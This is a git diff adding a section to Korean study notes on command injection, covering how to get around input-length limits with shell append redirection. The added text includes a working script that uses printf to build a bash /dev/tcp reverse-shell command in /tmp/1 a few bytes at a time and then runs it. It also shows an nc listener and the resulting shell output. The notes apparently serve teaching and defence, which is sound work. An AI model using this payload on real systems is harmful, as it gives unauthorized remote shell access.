@@ -384,6 +384,53 @@
 <br/>
 
 * 리다이렉션(Redirection)을 이용하는 방법
+    - 쉘의 기능인 append redirection(리다이렉션)을 이용해 사용자가 쓰기 권한을 갖고 있는 임의 디렉터리에 파일을 생성함 <br/> &nbsp;&nbsp; → 한 글자씩 원하는 문자를 파일에 저장한 후 ```bash```, ```python``` 등의 인터프리터를 이용해 실행함
+    - 예시: 입력 값의 길이가 제한된 상황에서 공격자의 서버와 리버스 연결을 맺는 상황
+        + 공격 스크립트
+            ```bash
+            printf bas>/tmp/1 # → Line 1
+            printf h>>/tmp/1
+            printf \<>>/tmp/1
+            printf /d>>/tmp/1
+            printf ev>>/tmp/1
+            printf /t>>/tmp/1
+            printf cp>>/tmp/1
+            printf />>/tmp/1
+            printf 1 >>/tmp/1
+            printf 2 >>/tmp/1
+            printf 7.>>/tmp/1
+            printf 0.>>/tmp/1
+            printf 0.>>/tmp/1
+            printf 1/>>/tmp/1
+            printf 1 >>/tmp/1 # → Line 15
+            printf 2 >>/tmp/1
+            printf 3 >>/tmp/1
+            printf 4 >>/tmp/1 # → Line 18
+            bash</tmp/1& # → Line 19
+            ```
+            | Line | 설명 |
+            |:---:|------|
+            | 1 ~ 18 | 공격자가 원하는 입력을 1~3바이트씩 입력함 <br/> &nbsp;&nbsp; → /tmp/1 파일에 ```bash</dev/tcp/127.0.0.1/1234```의 데이터가 입력됨 <br/> &nbsp;&nbsp;&nbsp;&nbsp; (```/tmp``` 디렉터리는 누구나 읽고 쓸 수 있는 권한이 존재함) |
+            | 15 ~ 18 | file descriptor로 인식되지 않기 위ㅐ서 ```print 1 >>/tmp/1```과 같이 숫자 뒤에 스페이스를 추가하고 있음 |
+            | 19 | ```/tmp/1```의 내용을 stdin으로 bash를 실행하여 리버스 쉘을 맺을 수 있음 |
+        + 공격자 서버
+            ```linux
+            $ nc -l -p 1234 -k -v
+            Listening on [0.0.0.0] (family 0, port 1234)
+            Connection from 127.0.0.1 52536 received!
+            bash>&0 2>&0
+            id
+            uid=1000(users) gid=1000(users) groups=1000(users)
+            ```
+            | Line | 설명 |
+            |:---:|------|
+            | 1 ~ 2 | 1234번 포트(```-p 1234```)로 tcp 연결을 기다리는(```-l```) ```nc``` 명령어 |
+            | 3 | TCP 연결이 맺어짐을 알려줌 |
+            | 4 | stdout, stderr를 0번 fd(socket)으로 redirection 시키는 bash를 생성함 <br/> &nbsp;&nbsp; → 이를 통해 원격의 데이터를 현재 소켓으로 출력시킬 수 있음
+
+<br/>
+
+* IP 주소 변환을 이용하는 방법
 
 <br/><br/><br/>
 
